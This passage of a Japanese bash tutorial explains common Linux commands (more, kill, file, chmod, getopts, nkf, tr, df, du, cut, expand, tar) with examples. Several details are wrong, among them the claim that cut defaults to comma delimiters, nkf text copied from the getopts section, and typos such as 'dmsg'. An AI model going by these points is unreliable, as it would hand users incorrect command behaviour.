のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。\nまた、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。\nmoreコマンドの書式 more [オプション] filename\ncat filename | more [オプション]\nmoreコマンドの主なオプション オプション 意味 +数値 数値で指定した行から表示する +/文字列 指定した文字列を検索して、見つけた行の2行上から表示する -s 連続した空行を1行にする -l 改ページを無視する -u 下線の処理を行わない -数値 画面の行数を指定する -f 画面での行数ではなく、データの行数を表示する -d 無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する moreコマンド詳細説明 「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。\nmoreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。\nファイルをページャとして読みたい場合\n$ cat \u0026lt;filename\u0026gt; | more dmsgなどのシステムファイルをページャとして読みたい\n$ dmsg | more ヒント 検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。 ヒント ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。 killコマンド killコマンドでプロセスIDを指定してプロセスを終了させる killallコマンドで名前を指定してプロセスを終了させる killコマンド概要 プロセスを強制終了させます。\nkillは実行中のプロセスを終了させる場合に使うコマンドです。\nkillコマンドでプロセスを終了させるには、\n$ kill ＜プロセスID＞ で指定します。\n例えば、100番のプロセスならば\n$ kill 100 と指定します。\nプロセスIDは「ps」コマンドで調べることができます。\nkillコマンドの書式 kill [オプション] プロセスID\nkillコマンドの主なオプション オプション 意味 -s シグナル プロセスに送るシグナル名または番号。-シグナル名、-番号でも指定可能 -l シグナル名のリストを表示する killコマンド詳細説明 プロセスＩＤでプロセスを終了させる 「kill プロセスID」で、指定したプロセスを終了させることができます。プロセスIDは「ps」コマンドで確認できます。\n$ kill ＜プロセスＩＤ＞ killallコマンドで名前を指定してプロセスを終了させる 「killall 名前」で、“名前”に指定したプロセスを終了させることができます。\n$ killall ＜プロセス名＞ さまざまなプロセスの調べ方と終了方法 ps aux を使う方法\nbash-5.1$ ps axu | grep hugo | grep -v grep suzukiiichiro 17498 0.0 3.4 5607088 567104 s003 S+ 水11AM 2:58.60 hugo -D server suzukiiichiro 20710 0.0 1.7 5328588 286744 s005 S+ 11:38AM 0:13.50 hugo server bash-5.1$ 最後の grep -v grep は、grep コマンドでプロセス名を検索したプロセスを除くという意味になります。\nさらにawkコマンドでプロセスＩＤを抽出します。\nbash-5.1$ ps axu | grep hugo | grep -v grep | awk \u0026#39;{ print $2; }\u0026#39; 17498 20710 bash-5.1$ pgrep を使う方法\npgrep は、指定したプロセスのプロセスＩＤを抽出する方法です。\nbash-5.1$ pgrep hugo 17498 20710 bash-5.1$ プロセスＩＤが解ったところでプロセスを終了します。\n表記 数値 意味 KILL 9 プロセスの強制終了命令 $ kill -9 17498 $ kill -9 20710 面倒ですね。プロセスがたくさんある場合はとても煩雑です。\nxargsコマンドを使うと一片にプロセスを終了させることができます。\nbash-5.1$ ps axu | grep hugo | grep -v grep | awk \u0026#39;{ print $2; }\u0026#39; | xargs kill -9 終了したいプロセス名が解っている場合は以下のコマンドで一発で全ての同名プロセスを終了させることができます。\n$ killall hugo fileコマンド ファイルの形式を表示する ファイルのリストから調べる シンボリックリンクの参照先を調べる 圧縮されているファイルを調べる fileコマンドと組み合わせてスクリプトファイルを一覧表示する whichコマンドと組み合わせてコマンドのファイル形式を調べる fileコマンド概要 「file」は、ファイル形式を調べるためのコマンドです。「file ファイル名」で、ファイルの形式が表示されます。テキストファイルの場合は、文字コードが表示されます。\nヒント fileコマンドを使わないとできないことがあります。ファイルの拡張子をみて画像ファイルであり、そのファイルタイプはjpgまたはgifという見分けをしますが、それはあくまで見た目の話で、ファイルの内容を確認するためのコマンドがfileコマンドになります。 fileコマンドの書式 file [オプション] ファイル1 ファイル2 ファイル3……\nfileコマンドの主なオプション オプション 意味 -f リスト\t検査するファイルの名前をリストファイルから読み込む -L シンボリックリンクの参照先を調べる -z 圧縮ファイルの中も検査する -b 出力行の最初にファイル名を表示しない -N 出力を整列するためのファイル名への空白の追加を行わない ヒント 一覧のオプションは一部です。 $ man file などで、fileの使い方を確認してください。 fileコマンド詳細説明 ファイルの形式を表示する システムメッセージを表示する\n$ file sample.jpg ヒント データファイルの場合は「.jpg」や「.mp3」といった拡張子で判断してしまうのが一般的ですが、fileコマンドの場合は拡張子ではなく、あくまでも“ファイルの内容”から判断します ファイルのリストから調べる 「-f」オプションで、ファイルの一覧を指定することができます。例えば、Linuxの設定ファイル「/etc/shells」にはインストールされているシェルがリストアップされていますが、「file -f /etc/shells」で、それぞれのシェルのファイル形式を調べることができます。\n$ file -f /etc/shell シンボリックリンクの参照先を調べる 「-L」オプションで、シンボリックリンクのリンク先を調べることができます。例えば、先ほどの実行結果から「/bin/csh」は、tcshへのシンボリックリンクであることが分かりました。「file -L /bin/csh」で、リンク先であるtcshのファイル形式が表示されます。\n$ file -L /bin/tcsh 圧縮されているファイルを調べる 「-z」オプションで、圧縮されているファイルの元の形式を調べることができます。\nbash-5.1$ file /usr/local/bin/openmpi-1.8.3.tar.gz /usr/local/bin/openmpi-1.8.3.tar.gz: gzip compressed data, last modified: Thu Sep 25 14:12:57 2014, max compression, from Unix bash-5.1$ ヒント $ man file などで、fileの使い方を確認してください。 chmodコマンド パーミッションを表すアルファベットと数値の意味 パーミッションを変更する パーミッションの変更内容を確認するには？ chmodコマンド概要 ファイルやディレクトリにアクセスできるかどうかは、ファイルの「パーミッション（許可属性）」によって決まります。このパーミッションを変更するコマンドが「chmod」です。\nchmodコマンドの書式 chmod [オプション] モード ファイル1 ファイル2 ファイル3……\nchmodコマンドの主なオプション オプション 意味 -R ファイルとディレクトリを再帰的に変更する -v 処理した内容を出力する -c 変更が行われた場合のみ処理内容を出力する -f ほとんどのエラーメッセージを出力しない ヒント 一覧のオプションは一部です。 $ man chmod などで、chmodの使い方を確認してください。 chmodコマンド詳細説明 パーミッションを表すアルファベットと数値の意味 記号 数字 意味 r 4 読み w 2 書き x 1 実行 - 0 拒否 具体的に以下のように表示される場合、「所有者」「所有グループ」「それ以外」の３桁で表されます。\nrw-rw-r\u0026ndash; 664\nrwxr-xr-x 755\nすくなくとも自分自身はおおむね「所有者」となりますので、\nrw-rw-r\u0026ndash; 664\nの場合は、所有者（自分自身）は、rw- 6 ですので、\n読み・書きはできるものの実行はできない（実行の必要がない）ファイル・ディレクトリということになります。\nrwxr-xr-x 755\nの場合は、所有者（自分自身）は、rwx 7 ですので、\n読み・書き・実行が可能なファイル・ディレクトリであるということになります。\nパーミッションを変更する いろいろな方法があります。\n一般的には（なにが一般的かもわかりませんが）以下の通りとなります。\nsample.txtのパーミッションを664に変更する\n$ chmod 664 sample.txt sample.txtのパーミッションを755に変更する\n$ chmod 755 sample.txt パーミッションの変更内容を確認するには？ chmodコマンドで「-v」オプションを指定すると、コマンドの実行内容が分かるようになります。パーミッションが変更されなかった場合も、現状がどのようになっているかが分かるように表示されます。\n$ chmod -v 755 sample.txt \u0026#39;sample.txt\u0026#39; のモードを 0664 (rw-rw-r--)から 0775 (rwxrwxr-x)へ変更しました ヒント $ chmod コマンドはとても重要、かつセキュリティ上注意が必要なコマンドです。なんでもかんでも777にしておくという大馬鹿ものが後を絶ちませんが、やめましょう。 ヒント -v オプションは常につけて実行しましょう。何を実行したのかを履歴に残しておくことで振り返って確認することができます。 getoptsコマンド オプションを解析する エラーメッセージを表示しない 引数付きのオプションを使用する getoptsコマンド概要 「getopts」は、bashのシェルスクリプト内でオプションを解析する際に役立つコマンドです。自作のシェルスクリプトで「-a」のような「ハイフン＋アルファベット1文字」のオプションを扱う際に便利です。「-f ファイル名」のように引数を取るオプションも解析できます。\n例えばこういうのです\n$ head -n10 文字列を渡すこともできます\n$ grep -f wordlist.txt ということで、自作のスクリプトでこういう事ができるわけです。\n$ myScript.sh -n10 -f addressList.txt ヒント getoptsとよく似た名前で用途も同じ「getopt」コマンド（/usr/bin/getopt）があります。getoptコマンドはgetoptsとは異なり、「\u0026ndash;」から始まるロングオプションも扱うことができます。 getoptsコマンドの書式 getopts オプション文字列 変数名\ngetoptsコマンドの主なオプション getoptsにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。\nオプション 意味 : エラーメッセージの表示の有無 ヒント 一覧のオプションは一部です。 $ man getopts などで、getoptsの使い方を確認してください。 getoptsコマンド詳細説明 オプションを解析する オプション「-a」「-b」「-c」を使用し、それぞれのオプションに応じてメッセージを表示します。\n#!/bin/bash while getopts abc OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された\u0026#34;;; *) echo \u0026#34;該当なし OPT=$OPT \u0026#34;;; esac done while getopts abc OPT; do\nの abc は、オプションの種類が a,b,cの３種類あることを明示的に指定しています。\nOPTは $OPT変数で、 a,b,cがそれぞれ順に代入されます。\n$ bash getopts.sh -a [-a] が指定された $ bash getopts.sh -ab [-a] が指定された [-b] が指定された $ bash getopts.sh -a -b [-a] が指定された [-b] が指定された $ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された $ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts.sh: 不正なオプションです -- d 該当なし OPT=? 以下のオプションは用意されていないことからエラー表示となります。\n$ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts.sh: 不正なオプションです -- d 該当なし OPT=? エラーメッセージを表示しない getoptsに指定していないオプションを使用すると、画面1のように「不正なオプションです \u0026ndash; d」、あるいは「illegal option \u0026ndash; d」のようなメッセージを表示します。\nこのようなgetoptsのエラーメッセージを表示したくない場合は、「getopts :abc OPT」のように、オプション文字列の先頭に「:」記号を入れます。\n#!/bin/bash while getopts :abc OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された\u0026#34;;; *) echo \u0026#34;該当なし OPT=$OPT \u0026#34;;; esac done エラーが表示される getopts01.sh\n$ bash getopts01.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts01: 不正なオプションです -- d 該当なし OPT=? エラーが表示されない getopts02.sh\n$ bash getopts02.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された 該当なし OPT=? 引数付きのオプションを使用する 「-f ファイル名」のように、引数を取るオプションを解析したい場合は、オプション文字の後に「:」記号を付けます。オプションの引数は、組み込み変数「OPTARG」で参照できます。\n#!/bin/bash while getopts :a:bc: OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された(引数=$OPTARG)\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された(引数=$OPTARG)\u0026#34;;; :) echo \u0026#34;$OPTARGに引数が指定されていません\u0026#34;;; ?) echo \u0026#34;$OPTARGは定義されていません\u0026#34;;; esac done 実行結果\n$ bash getopts03.sh -a filename -b -c 100 [-a] が指定された 引数=filename [-b] が指定された [-c] が指定された 引数=100 $ 解説\n:a:bc:　について\n:a エラー表示をしないというオプションとなります。 a: -a が指定された場合は引数に数値または文字列を受け取ります。 c: -c が指定された場合は引数に数値または文字列を受け取ります。 ヒント アホか。というくらいまぎらわしくてわかりにくい設計で笑えます。一体どこの誰がこんなわかりにくい仕様にしたのでしょう。 ヒント とにかくシェルクスクリプトで起動パラメータを設定することができました。便利なツールをたくさん作ってください。では nkfコマンド 文字コードと改行コードを変換する 文字コードを判定する 文字コードを変換してファイルを書き換える CentOS 7にnkfをインストールするには？ nkfコマンド概要 「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。\nnkfコマンドの書式 nkf [オプション] [ファイル]\nnkf [オプション] \u0026ndash;overwrite ファイル\nnkfコマンドの主なオプション nkfにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。\nオプション 意味 -j(入力は J) JISコードを出力する -e(入力は E) EUCコードを出力する -s(入力は S) シフトJISコードを出力する -w(入力は W) UTF-8コードを出力する（BOMなし） -Lu 改行をLFにする（UNIX系） -g 自動判別の結果を出力する \u0026ndash;overwrite ファイルを変換して上書きする ヒント UTF-8に変換する場合は $ nkf -wLu となります。\nこのオプションの意味は、改行コードをUNIX系のLFに変換してUTF-8で出力、です。 ヒント 一覧のオプションは一部です。 $ man nkf などで、nkfの使い方を確認してください。 nkfコマンド詳細説明 文字コードと改行コードを変換する kfは「nkf ファイル名」で指定したファイル、または標準入力から受け取った内容を変換して、標準出力に書き出します。\nLinux環境で扱いやすいように、文字コードを「UTF-8」（-wオプション）、改行コードを「LF」（-Luオプション）に変換するには、リダイレクトするか、「nkf -wLu 元ファイル \u0026gt; 保存ファイル名」のように指定します。なお、入力側の文字コードは自動で判定されます。\n改行コードはUNIX系のLFで、UTF-8で変換出力\n$ cat sjisFile.txt | nkf -wLu \u0026gt; 保存ファイル名.txt 文字コードを判定する 「-g（\u0026ndash;guess）」オプションを付けると、使用されている文字コードと改行コードの判定結果を表示することができます。\n得体のしれないファイルを調査する\n$ cat sjisFile.txt | nkf -g sjisFile.txt: UTF-8 (LF) 文字コードを変換してファイルを書き換える 「\u0026ndash;overwrite」オプションでは、指定したファイルの文字コードを変換して、直接書き換えることができます。\n文字コードを変換してファイルを書き換える\n$ cat sjisFile.txt | nkf -wLu --overwrite ヒント \u0026ndash;overwrite オプションで元のファイルを上書きするのは一見便利なオプションに見えますが、別ファイルに出力して、元のファイルは極力残すようにしておくべきだと思います。僕は。 CentOS 7にnkfをインストールするには？ rpmでインストール\n$ yum localinstall http://mirror.centos.org/centos/6/os/x86_64/Packages/nkf-2.0.8b-6.2.el6.x86_64.rpm ソースからインストール\n$ wget https://osdn.jp/dl/nkf/nkf-2.1.4.tar.gz $ tar -xzvf nkf-2.1.4.tar.gz $ cd nkf-2.1.4/ $ make $ sudo make install ヒント rpmやyumでインストールする場合と、ソースからインストールする場合、いずれも好みです。人それぞれのやり方や考え方でいいと思います。いずれ使い分けができるようになると思います。今はうまく行ったほうで頑張ってください。 if 文字列一致の検出 if [[ \u0026#34;$c\u0026#34; == \u0026#34;read\u0026#34; ]]; then outputdir=\u0026#34;seq\u0026#34;; else outputdir=\u0026#34;write\u0026#34; ; fi myfile に文字列 \u0026rsquo;test\u0026rsquo; が含まれているかどうかを確認 ``` bah if grep -q hello myfile; then echo -e \u0026#34;file contains the string!\u0026#34; ; fi 変数がnull であるかを確認 myvariable=\u0026#34;\u0026#34;;if [ ! -s \u0026#34;myvariable\u0026#34; ]; then echo -e \u0026#34;variable is null!\u0026#34; ; fi 該当のファイルが存在するかを確認 if [ -e \u0026#39;filename\u0026#39; ];then echo -e \u0026#34;file exists!\u0026#34;; fi ファイルに加えてシンボリックリンクの存在も確認 if [ -e myfile ] || [ -L myfile ];then echo -e \u0026#34;file exists!\u0026#34;; fi xの値が５以上かどうかを確認 if [ \u0026#34;$x\u0026#34; -ge 5 ]; then echo -e \u0026#34;greater or equal than 5!\u0026#34; ; fi bash版：xの値が５以上かどうかを確認 if ((x \u0026gt;= 5)); then echo -e \u0026#34;greater or equal than 5!\u0026#34; ; fi (( )) を使う j=3;u=1;if ((j==u+2)); then echo -e \u0026#34;j==u+2\u0026#34;;fi [[ ]] を使う age=25;if [[ $age -gt 21 ]]; then echo -e \u0026#34;forever 21\u0026#34; ; fi for ディレクトリ内のファイル名を出力 for i in $(ls); do echo file: $i;done もしくは、\nfor i in *; do echo file: $i; done myfile内に記載された名前を使ってディレクトリを作成 for dir in $(\u0026lt;myfile); do mkdir $dir; done read ユーザー入力の読み取り read input echo $input 配列 配列の宣言 declare -a array=() または\ndeclare array=() または\ndeclare -A array=() trコマンド 文字を置換する 大文字／小文字を変換する 改行を除去する 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する trコマンド概要 「tr」は、文字を置き換えるためのコマンドです。指定した文字を別の文字に置き換えたり、指定した文字を削除したり、文字が連続している場合には1つにまとめたりすることもできます。\nですが、sedでもっと細かく制御できるので、trは「改行を除去する」ためのコマンドに成り果ててしまいました。ここでは改行を除去することだけにフォーカスしてご説明します。\ntrコマンドの書式 tr [オプション] 文字セット1 [文字セット2]\ntrコマンドの主なオプション オプション 意味 -d \u0026lsquo;文字\u0026rsquo;を削除する trコマンド詳細説明 文字を置換する sedを使いましょう。\n$ tr 012 abc ヒント 012 という文字列を置き換えるのではなく、0をaに、1をbに、2をcに置き換えます。 大文字／小文字を変換する sedを使いましょう。\n大文字／小文字を変換する\n$ tr ABC abc ヒント ABC という文字列を置き換えるのではなく、Aをaに、Bをbに、Cをcに置き換えます。 また、文字を範囲で指定することも可能です。「tr A-Z a-z」で「A」は「a」に、「B」は「b」に……と対応する文字に置き換えられます。\n$ tr A-Z a-z 改行を除去する 「-d」オプションで、指定した文字を削除することができます。\nファイル中の改行を除去\n$ cat sample.txt | tr -d \u0026#39;\\n\u0026#39; \u0026gt; 出力ファイル名 文字列中の改行を除去\n$ echo \u0026#34;$string_sample\u0026#34; | tr -d \u0026#39;\\n\u0026#39; ヒント trコマンドの唯一の利点、sedより優れているただ一つの機能、それが tr -d \u0026lsquo;\\n\u0026rsquo; です。 重要 tr -d \u0026lsquo;\\n\u0026rsquo; のくくりはシングルクォーテーションである必要があります。ダブルクォーテーションではいけません。理由は「文字列」ではなく「文字（一文字）」しか扱えないからです。 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する ls -la コマンドで普通に出力します。\n$ ls -la drwxr-xr-x 13 suzukiiichiro staff 416 7 14 13:31 ./ drwxrwxrwx+ 48 suzukiiichiro staff 1536 7 5 10:05 ../ drwxrwxrwx 7 suzukiiichiro staff 224 4 10 2020 AI_Algorithm_Game_Bash/ drwxrwxrwx 18 suzukiiichiro staff 576 4 10 2020 AI_Algorithm_Game_Chess/ drwxrwxrwx 39 suzukiiichiro staff 1248 4 10 2020 AI_Algorithm_Game_Othello/ drwxrwxrwx 31 suzukiiichiro staff 992 4 10 2020 AI_Algorithm_Game_RubiksCube/ drwxrwxrwx 33 suzukiiichiro staff 1056 4 10 2020 AI_Algorithm_Game_Shogi/ drwxrwxrwx 7 suzukiiichiro staff 224 4 10 2020 C_Othello/ 連続した空白をタブに変換します。\n$ ls -l | tr -s \u0026#34; \u0026#34; \u0026#34;\\t\u0026#34; total\t528 drwxrwxrwx\t7\tsuzukiiichiro\tstaff\t224\t4\t10\t2020\tAI_Algorithm_Game_Bash/ drwxrwxrwx\t18\tsuzukiiichiro\tstaff\t576\t4\t10\t2020\tAI_Algorithm_Game_Chess/ drwxrwxrwx\t39\tsuzukiiichiro\tstaff\t1248\t4\t10\t2020\tAI_Algorithm_Game_Othello/ drwxrwxrwx\t31\tsuzukiiichiro\tstaff\t992\t4\t10\t2020\tAI_Algorithm_Game_RubiksCube/ drwxrwxrwx\t33\tsuzukiiichiro\tstaff\t1056\t4\t10\t2020\tAI_Algorithm_Game_Shogi/ drwxrwxrwx\t7\tsuzukiiichiro\tstaff\t224\t4\t10\t2020\tC_Othello/ 連続した空白をカンマに変換します。\n$ ls -l | tr -s \u0026#34; \u0026#34; \u0026#34;,\u0026#34; drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,AI_Algorithm_Game_Bash/ drwxrwxrwx,18,suzukiiichiro,staff,576,4,10,2020,AI_Algorithm_Game_Chess/ drwxrwxrwx,39,suzukiiichiro,staff,1248,4,10,2020,AI_Algorithm_Game_Othello/ drwxrwxrwx,31,suzukiiichiro,staff,992,4,10,2020,AI_Algorithm_Game_RubiksCube/ drwxrwxrwx,33,suzukiiichiro,staff,1056,4,10,2020,AI_Algorithm_Game_Shogi/ drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,C_Othello/ dfコマンド ディスクの空き容量を調べる dfコマンド概要 「df」は、ディスクの空き領域（freeスペース）のサイズを集計して表示するコマンドです。引数でファイルやディレクトリを指定すると、そのファイルが保存されている場所の空き領域が表示されます。指定しなかった場合は、現在マウントされている全ての場所について空き領域を表示します。\nヒント dfコマンドで最も使われるオプションは -h です。この一つだけを覚えていれば大丈夫です。 dfコマンドの書式 df [オプション] [ファイル]\ndfコマンドの主なオプション オプション 意味 -h サイズに応じて読みやすい単位で表示する dfコマンド詳細説明 ディスクの空き容量を調べる 簡単です。\n$ df -h Filesystem Size Used Avail Capacity iused ifree %iused Mounted on /dev/disk1s1 466Gi 398Gi 64Gi 87% 2377176 9223372036852398631 0% / devfs 194Ki 194Ki 0Bi 100% 671 0 100% /dev /dev/disk1s4 466Gi 3.0Gi 64Gi 5% 5 9223372036854775802 0% /private/var/vm map -hosts 0Bi 0Bi 0Bi 100% 0 0 100% /net map auto_home 0Bi 0Bi 0Bi 100% 0 0 100% /home ヒント 要するに空き容量を確認するためのコマンドがdfで、-hオプションを付けることによって、サイズがわかりやすくなる、という仕組みです。深く考えるのはやめましょう。 duコマンド ディレクトリごとのディスク使用量を表示する ディスク使用量の合計だけを表示する カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する duコマンド概要 「du」は、ディスクの使用量をディレクトリごとに集計して表示するコマンドです。ファイルを指定した場合は指定したファイルのサイズのみ、ディレクトリを指定した場合はそのディレクトリおよび全てのサブディレクトリの使用量を集計します。対象を指定しなかった場合は、カレントディレクトリの使用量が表示されます。\nヒント duコマンドで最も使われるオプションは -h -s です。この組み合わせだけを覚えていれば大丈夫です。 duコマンドの書式 du [オプション] [ファイルまたはディレクトリ]\nduコマンドの主なオプション オプション 意味 -h サイズに応じて読みやすい単位で表示する -s 指定したディレクトリの合計のみを表示する duコマンド詳細説明 ディレクトリごとのディスク使用量を表示する $ du -h : : ＜どばーっとでてきます＞ : : ヒント あまりにもたくさん表示されて、なにがなんだかわかりませんね。大丈夫です。次の項で -s オプションを紹介します。 ディスク使用量の合計だけを表示する 指定したディレクトリの合計容量だけを表示したい場合は、「-s」オプションを使用します。\ndu -s で、カレントディレクトリが使用している容量が表示されます。\n$ du -h -s 1.4G\t. カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する カレントディレクトリ直下のファイル、またはディレクトリごとの集計値を表示するには、アスタリスク * をつけます。\ndu -h -s * で、カレントディレクトリ直下のファイルおよびディレクトリごとの集計となります。\n$ du -h -s * 72K\tAI_Algorithm_Game_Bash 440K\tAI_Algorithm_Game_Chess 276M\tAI_Algorithm_Game_Othello 971M\tAI_Algorithm_Game_RubiksCube 157M\tAI_Algorithm_Game_Shogi ヒント duコマンドはディレクトリ以下の使用量を表示するコマンドです。dfコマンド同様 -h でサイズが見やすく表示されます。 -s でカレントディレクトリの使用量が表示され、* をつけると、ディレクトリ内のサブディレクトリごとの使用量が表示されます。 du -h -s * のひとかたまりで覚えるのがポイントです。 cutコマンド 文字数を指定して切り出す 列を指定して切り出す 出力の区切り文字を変更する cutコマンド概要 「cut」は、ファイルを読み込んで、それぞれの行から指定した部分だけを切り出すコマンドです。例えば、「3文字目から10文字目」や、タブなどで区切られたファイルから「1番目の列と3番目の列」のように選んで取り出すことができます。\ncutコマンドの書式 cut オプション [ファイル]\ncutコマンドの主なオプション オプション 意味 -c 切り出す位置のリストを文字数で指定する -f 1,3または1-3 切り出す位置のリストをタブ区切りの列で指定する（区切り文字は「-d」オプションで変更可能） -d \u0026lsquo;文字\u0026rsquo; 列の区切り文字として、タブの代わりに使用する文字を指定する（1文字のみ） cutコマンド詳細説明 文字数を指定して切り出す cutコマンドで頭から4文字を切り出す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo $string | cut -c 1-4 Hell bashの文字列変数で頭から4文字を切す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo ${STR:0:4} Hell sedコマンドで先頭から4文字切り出す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo \u0026#34;${STR}\u0026#34; | sed \u0026#39;s/^\\(.\\{4\\}\\).*$/\\1/\u0026#39; Hell 列を指定して切り出す 列の区切り文字は、デフォルトで ,(カンマ）とTAB(タブ）です。\n特に指定しなければ、cutコマンドが考えて区切り文字として認識してくれます。\nただカンマとTABが混在している場合は不安ですね。\n次の項で、区切り文字（デリミタ）を指定する方法を説明します。\n区切り文字のデフォルトがカンマとタブだから\n/etc/passwdのようにデリミタを指定しないときちんと区切られない。\n$ sudo cat /etc/passwd | cut -f 1,7 | tail _findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false _datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false _captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false _ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false _applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false _hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false _cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false _analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false _fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false _timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false デリミタを指定した場合はきちんと１番目、７番目の列が切り取られました\nまずはcutコマンドで実現します。\n$ sudo cat /etc/passwd | cut -f 1,7 -d \u0026#39;:\u0026#39; | tail _findmydevice:/usr/bin/false _datadetectors:/usr/bin/false _captiveagent:/usr/bin/false _ctkd:/usr/bin/false _applepay:/usr/bin/false _hidd:/usr/bin/false _cmiodalassistants:/usr/bin/false _analyticsd:/usr/bin/false _fpsd:/usr/bin/false _timed:/usr/bin/false $ 同じことをawkコマンドでやってみます。デリミタの区切り指定は -F です。\n$ sudo cat /etc/passwd | awk -F \u0026#39;:\u0026#39; \u0026#39;{ print $1\u0026#34;:\u0026#34;$7;}\u0026#39; | tail _findmydevice:/usr/bin/false _datadetectors:/usr/bin/false _captiveagent:/usr/bin/false _ctkd:/usr/bin/false _applepay:/usr/bin/false _hidd:/usr/bin/false _cmiodalassistants:/usr/bin/false _analyticsd:/usr/bin/false _fpsd:/usr/bin/false _timed:/usr/bin/false $ ヒント 文字を切り出す方法にもいくつかありますし、列の切り出しにもいろいろな方法があります。用途に合わせて使い分けてください。最初のうちは、一つの方法を覚えておけばよいです。 expandコマンド タブを空白に変換する（expandコマンド） タブの幅を指定する expandコマンド概要 「expand」はタブを空白に変換するコマンド、「unexpand」は空白をタブに変換するコマンドです。デフォルトのタブ幅は8桁で、これを変更したい場合は「-t」オプションでタブの文字数を指定します。\nexpandコマンドの書式 expand [オプション] [ファイル]\nunexpand [オプション] [ファイル]\nexpandコマンドの主なオプション オプション 意味 -t 文字数 タブの文字数またはタブ位置のリストを指定する expandコマンド詳細説明 タブを空白に変換する まずサンプルファイルを用意します。\n$ echo -e \u0026#34;No-1\\tTokyo\\t1354098\\nNo-2\\tOsaka\\t934765\\nNo-3\\tNagoya\\t786592\u0026#34; \u0026gt; ex.txt $ cat ex.txt No-1\tTokyo\t1354098 No-2\tOsaka\t934765 No-3\tNagoya\t786592 expandコマンドでタブを空白に変換します。\n$ expand ex.txt \u0026gt; ex2.txt $ cat ex2.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 見た目は全く変わりませんが、タブが空白に置き換えられました。\nデフォルトのタブ幅は８です。\nタブの幅を指定する タブ幅を変更する場合は、「-t」オプションを使用します。例えば、12文字の幅にしたい場合は「-t 12」と指定します。\n# サンプルファイルを作成 $ echo -e \u0026#34;No-1\\tTokyo\\t1354098\\nNo-2\\tOsaka\\t934765\\nNo-3\\tNagoya\\t786592\u0026#34; \u0026gt; ex.txt $ cat ex.txt No-1\tTokyo\t1354098 No-2\tOsaka\t934765 No-3\tNagoya\t786592 # タブ幅のデフォルトは8です。 $ expand ex.txt \u0026gt; ex2.txt $ cat ex2.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 # タブ幅を10に指定 $ expand -t 10 ex.txt \u0026gt;ex3.txt $ cat ex3.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 ヒント タブ幅を変更する場合には、$ expand -t 10 と、覚えておけば良いと思います。 tarコマンド アーカイブファイルを作成する アーカイブファイルを展開する tarコマンド概要 「tar」は、複数のファイルを1つにまとめた“アーカイブファイル”を作成／展開するコマンドです。\n「アーカイブ（archive）」は「書庫」という意味で、プログラムのソースコードなど、複数の関連するファイル群をまとめて保管したり、配布したりする際に使用します。\ntarコマンドの書式 tar -czvf アーカイブ.tgz 対象ファイル\n（ファイルのアーカイブを作成しgzip形式で圧縮する）\ntar -xzvf アーカイブ.tgz\n（gzipで圧縮されたアーカイブを展開する）\ntarコマンドの主なオプション オプション 意味 -c 新しいアーカイブを作成する -x アーカイブからファイルを抽出する tarコマンド詳細説明 アーカイブファイルを作成する アーカイブファイルを作成するには「-c」オプション、アーカイブをgzip形式で圧縮するには「-z」オプションを指定し、「-f」オプションでアーカイブファイル名を指定します。\n$ tar -czvf archive.tgz * アーカイブファイルを展開する 